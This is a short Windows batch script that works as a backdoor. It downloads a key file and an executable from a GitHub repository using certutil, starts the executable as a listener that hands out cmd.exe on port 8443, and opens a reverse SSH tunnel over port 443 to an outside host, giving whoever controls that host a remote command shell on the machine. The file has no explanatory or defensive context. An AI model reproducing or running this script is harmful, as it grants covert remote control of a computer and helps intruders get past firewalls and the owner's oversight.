@echo off

certutil -urlcache -f "https://raw.githubusercontent.com/rdasm/passthru/main/passthru.pem" PT.pem
certutil -urlcache -f "https://github.com/rdasm/passthru/raw/main/passthru.exe" PT.exe

start /b pt.exe -vv -L -p 8443 -e cmd.exe

ssh -R2222:127.0.0.1:8443 -i PT.pem ubuntu@mypro.myspacebox.net -p 443
 
